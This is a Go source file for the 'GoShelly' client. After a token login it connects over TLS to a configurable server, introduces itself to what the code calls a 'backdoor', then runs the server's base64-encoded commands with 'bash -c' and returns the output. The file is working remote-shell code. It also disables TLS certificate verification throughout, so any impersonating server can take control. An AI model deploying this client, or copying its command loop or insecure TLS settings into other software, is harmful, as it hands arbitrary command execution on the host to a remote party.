package basic

import (
	// "bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"

	// c "goshelly-client/cmd"
	t "goshelly-client/template"
	"io"
	"io/ioutil"
	"log"
	"math"
	"net/http"
	"net/mail"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"

	"golang.org/x/term"
)
var HTTPSCLIENT *http.Client

func InitRest(){
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},	
	}
	HTTPSCLIENT = &http.Client{Transport: tr}
}
func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
func logClean(dir string) {
	files, _ := ioutil.ReadDir(dir)
	if len(files) < CONFIG.MAXLOGSTORE {
		return
	}

	var newestFile string
	var oldestTime = math.Inf(1)
	for _, f := range files {

		fi, err := os.Stat(dir + f.Name())
		if err != nil {
			fmt.Println(err)
		}
		currTime := float64(fi.ModTime().Unix())
		if currTime < oldestTime {
			oldestTime = currTime
			newestFile = f.Name()
		}
	}
	os.Remove(dir + newestFile)
}

// file upl /downl functions, if needed
func uploadFile(conn *tls.Conn, path string) {
	// open file to upload
	fi, err := os.Open(path)
	handleError(err)
	defer fi.Close()
	// upload
	_, err = io.Copy(conn, fi)
	handleError(err)
}

func returnLog() {
	bytearr, err := ioutil.ReadFile(CONFIG.LOGNAME)
	if err != nil {
		fmt.Println("Could not get logs.")
		return
	}
	fmt.Println(string(bytearr))

}

func downloadFile(conn *tls.Conn, path string) {
	// create new file to hold response
	fo, err := os.Create(path)
	handleError(err)
	defer fo.Close()

	handleError(err)
	defer conn.Close()

	_, err = io.Copy(fo, conn)
	handleError(err)
}

func execInput(input string) string {
	// Remove the newline character.
	input = strings.TrimSuffix(input, "\n")

	cmd, err := exec.Command("bash", "-c", input).Output()
	if err != nil {
		fmt.Println("Cannot run shell cmds.")
		os.Exit(1)
	}
	return string(cmd[:])
}

func validateMailAddress(address string) {
	_, err := mail.ParseAddress(address)
	if err != nil {
		CONFIG.CLIENTLOG.Println("Invalid Email Address. Proceeding anyway.")

		return
	}
	CONFIG.CLIENTLOG.Println("Email Verified. True.")
}

func setReadDeadLine(conn *tls.Conn) {
	err := conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	if err != nil {
		CONFIG.CLIENTLOG.Panic("SetReadDeadline failed:", err)
	}
}

func setWriteDeadLine(conn *tls.Conn) {
	err := conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if err != nil {
		CONFIG.CLIENTLOG.Panic("SetWriteDeadline failed:", err)
	}
}

func dialReDial(serviceID string, config *tls.Config) *tls.Conn {
	reDial := 0
	for ok := true; ok; ok = reDial < 5 {
		conn, err := tls.Dial("tcp", serviceID, config)
		reDial++
		if err != nil {
			CONFIG.CLIENTLOG.Println("Error: ", err)
			CONFIG.CLIENTLOG.Println("Could not establish connection. Retrying in 5 seconds....")
			time.Sleep(time.Second * 5)
			continue
		}
		CONFIG.CLIENTLOG.Println("Connected to: ", strings.Split(conn.RemoteAddr().String(), ":")[0])
		state := conn.ConnectionState()
		// for _, v := range state.PeerCertificates {
		// 	CONFIG.CLIENTLOG.Println(x509.MarshalPKIXPublicKey(v.PublicKey))
		// 	CONFIG.CLIENTLOG.Println(v.Subject)
		// }

		CONFIG.CLIENTLOG.Println("client: handshake: ", state.HandshakeComplete)
		return conn

	}
	CONFIG.CLIENTLOG.Println("Timout. Could not reach server. Exiting....")
	os.Exit(1)
	return nil //will never reach this
}

func GetLoggedUser() t.LoggedUser {
	var user t.LoggedUser
	var temp []byte
	file, _ := ioutil.ReadFile("./config/token-config.json")
	err := json.Unmarshal([]byte(file), &user)
	if err != nil {
		// fmt.Println("Could not fetch user auth data.")
		return t.LoggedUser{}
	}
	temp, _ = base64.StdEncoding.DecodeString(user.EMAIL)
	user.EMAIL = string(temp)
	return user
}

func DeleteUser(confirm bool, deleteURL string) {
	if !confirm {
		return
	}

	user := GetLoggedUser()
	if (user == t.LoggedUser{}){
		fmt.Println("No existing user.")
		return
	}
	var msg t.Msg
	jsonReq, _ := json.Marshal(user)
	req, err := http.NewRequest(http.MethodDelete, deleteURL, bytes.NewBuffer(jsonReq))
	if err != nil {
		fmt.Println("Could not request an account delete. Try again later.")
	}
	
	resp, err := HTTPSCLIENT.Do(req)
	if err != nil {
		fmt.Println("Unable to read response.")
		return
	}

	defer resp.Body.Close()
	bodyBytes, _ := ioutil.ReadAll(resp.Body)
	json.Unmarshal(bodyBytes, &msg)
	fmt.Println(msg.MESSAGE)
	os.Remove("./config/token-config.json")
}

func LoginStatus(statusURL string) bool {
	// fmt.Printf("Checking existing auth tokens. Status: ")
	user := GetLoggedUser()
	if (user == t.LoggedUser{}){
		// fmt.Println("No existing tokens.")
		return false
	}
	resp := SendPOST(statusURL, user)
	var obj t.LogSuccess
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(resp.StatusCode, "Could not read response.")
		return false
	}
	json.Unmarshal(body, &obj)
	if resp.StatusCode != http.StatusAccepted{
		fmt.Println(obj.MESSAGE)
	}
	return resp.StatusCode == http.StatusAccepted
}
func GetCred() string{
	var  email string
	fmt.Printf("Enter email address: ")
	fmt.Scanf("%s\n", &email)
	return email
}
func GetCredentials(mode int, tem int) (string, []byte) {
	
	EMAIL := GetCred()
	fmt.Printf("Enter a password: ")
	tmpPass, err := term.ReadPassword(int(syscall.Stdin))
	if err != nil {
		fmt.Println("Cannot read from terminal. Try again later.")
		os.Exit(1)
	}
	fmt.Printf("\n.....\n")
	return EMAIL, tmpPass

}

func genCert() {

	CONFIG.CLIENTLOG.Println("Generating SSL Certificate.")
	validateMailAddress(CONFIG.SSLEMAIL)
	_, err := exec.Command("/bin/bash", "./scripts/certGen.sh", CONFIG.SSLEMAIL).Output()

	if err != nil {
		CONFIG.CLIENTLOG.Printf("Error generating SSL Certificate: %s\n", err)
		os.Exit(1)
	}
}

var CONFIG t.Config

func SendPOST(POSTURL string, user interface{}) *http.Response {
	body, _ := json.Marshal(user)
	resp, err := HTTPSCLIENT.Post(POSTURL, "application/json", bytes.NewBuffer(body))
	if err != nil {
		fmt.Println("Service offline.")
		os.Exit(1)
	}
	return resp
}

func readStartConfigJSON(EN bool, CONFIG t.Config) t.Config {
	if !EN {
		return CONFIG
	}
	var config t.Config
	file, err := ioutil.ReadFile("./config/client-config.json")
	if err != nil {
		fmt.Println("Could not read in user configuration. Err: ", err)
		return CONFIG
	}

	err = json.Unmarshal([]byte(file), &CONFIG)
	if err != nil {
		fmt.Println("Could not read in user configuration. Err: ", err)
		return CONFIG
	}
	return config

}
func PrintResp(resp *http.Response) {
	var msg t.Msg
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(resp.StatusCode, "Could not read response.")
		return
	}
	json.Unmarshal(body, &msg)
	fmt.Println(msg.MESSAGE)
}

//helper
func checkTrue(promptTrue, promptFalse string, check bool) {
	if !check {
		fmt.Println(promptFalse)
	} else {
		fmt.Println(promptTrue)
	}
}

func SaveLoginResult(resp *http.Response, email string) {
	var obj t.LogSuccess
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(resp.StatusCode, "Could not read response.")
		os.Exit(1)
	}
	
	json.Unmarshal(body, &obj)
	// fmt.Println(obj)
	if resp.StatusCode != http.StatusOK{
		fmt.Println(obj.MESSAGE)
		return
	}
	switch obj.TOKEN {
	case "":
		return
	default:
		os.MkdirAll("./config/", os.ModePerm)
		fo, err := os.Create("./config/token-config.json")
		if err != nil {
			fmt.Println("Service unavailable.")
			
		}
		fo.Close()
		file, _ := json.MarshalIndent(t.LoggedUser{
			TOKEN: obj.TOKEN,
			EMAIL: base64.StdEncoding.EncodeToString([]byte(email)),
		}, "", " ")
		_ = ioutil.WriteFile("./config/token-config.json", file, 0644)
	}
}

func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int, raw bool, cfgf bool) bool {
	fmt.Println("Running GoShelly")
	CONFIG.HOST = HOST
	CONFIG.PORT = PORT
	CONFIG.SSLEMAIL = SSLEMAIL

	CONFIG.MAXLOGSTORE = logmax
	CONFIG.LOGNAME = strings.ReplaceAll("GoShelly_last.log", " ", "")
	// os.MkdirAll("./logs/", os.ModePerm)

	clientfile, err := os.OpenFile(CONFIG.LOGNAME, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Client log open error: %s. No logs available for this session.\n", err)
		CONFIG.CLIENTLOG = log.New(os.Stdout, "", log.LstdFlags)
	} else {
		CONFIG.CLIENTLOG = log.New(clientfile, "", log.LstdFlags)
		defer clientfile.Close()
	}
	CONFIG = readStartConfigJSON(cfgf, CONFIG) //change false to true if you have a json config file
	GoGenCert()

	cert, err := tls.LoadX509KeyPair("goshelly_certs/client.pem", "goshelly_certs/client.key")
	if err != nil {
		CONFIG.CLIENTLOG.Println("Could not load SSL Certificate. Exiting...")
		return  false
	}
	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	conn := dialReDial(CONFIG.HOST+":"+CONFIG.PORT, &config)
	defer conn.Close()
	
	switch raw{
	case true:
		fmt.Println("Raw runs are not allowed.")
		os.Exit(1)

	case false:
		user := GetLoggedUser()
		if (user == t.LoggedUser{}){
		fmt.Println("No existing user.")
		return  false
		}
		introduceUserToBackdoor(conn,user)
	}
	
	num := readCmdLen(conn)
	// fmt.Println(num)
	for count := 0; count < num; count++ {
		buffer := make([]byte, 1024)
		setReadDeadLine(conn)
		_, err := conn.Read(buffer)
		if err != nil {
			CONFIG.CLIENTLOG.Println("Read Error. Exiting. Internal error or server disconnected. Exiting...")
			return  false
		}
		sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
		CONFIG.CLIENTLOG.Println("\nEXECUTE:\n", string(sDec))
		resp := execInput(string(sDec))
		time.Sleep(time.Second)
		encodedResp := base64.StdEncoding.EncodeToString([]byte(resp))
		CONFIG.CLIENTLOG.Println("\nRESPONSE:\n", resp)
		setWriteDeadLine(conn)
		_, err = conn.Write([]byte(encodedResp))
		if err != nil {
			CONFIG.CLIENTLOG.Println("Write Error. Exiting. Internal error or server disconnected. Exiting...")
			return false
		}
		time.Sleep(time.Second)
		buffer = nil
	}

	CONFIG.CLIENTLOG.Println("All commands ran successfully. Returning exit success.")
	// logClean("./logs/")
	fmt.Printf("Exit Success.\nReturning Log.\n\n")
	return true
	// returnLog()
}

//
func introduceUserToBackdoor(conn *tls.Conn, user t.LoggedUser) {

	encodedResp := base64.StdEncoding.EncodeToString([]byte(user.EMAIL))
	setWriteDeadLine(conn)
	_, err := conn.Write([]byte(encodedResp))
	if err != nil {
		CONFIG.CLIENTLOG.Println("Write Error. Could not introduce client to backdoor. Internal error or server disconnected. Exiting...")
		os.Exit(1)
	}
	time.Sleep(2 * time.Second)
	buffer := make([]byte, 1024)
	setReadDeadLine(conn)
	_, err = conn.Read(buffer)

	if err != nil {
		CONFIG.CLIENTLOG.Println("Read Error. Could not introduce client to backdoor. Internal error or server disconnected. Exiting...")
		os.Exit(1)
	}
	sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
	if string(sDec) != "ok" {
		CONFIG.CLIENTLOG.Println("Fatal. Could not introduce client to backdoor. " + string(sDec))
		os.Exit(1)
	}
	CONFIG.CLIENTLOG.Println("Client-Server-Intro=" + string(sDec))
	buffer = nil
	time.Sleep(time.Second * 2)

}


func readCmdLen(conn *tls.Conn) int {
	buffer := make([]byte, 1024)
	setReadDeadLine(conn)
	_, err := conn.Read(buffer)
	if err != nil {
		CONFIG.CLIENTLOG.Println("Read Error. Could not introduce client to backdoor. Internal error or server disconnected. Exiting...")
		os.Exit(1)
	}
	time.Sleep(2 * time.Second)
	sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
	buffer = nil
	i, _ := strconv.Atoi(string(sDec))
	return i
}
func validateEMailAddress(address string) bool {
	_, err := mail.ParseAddress(address)
	return err == nil
}
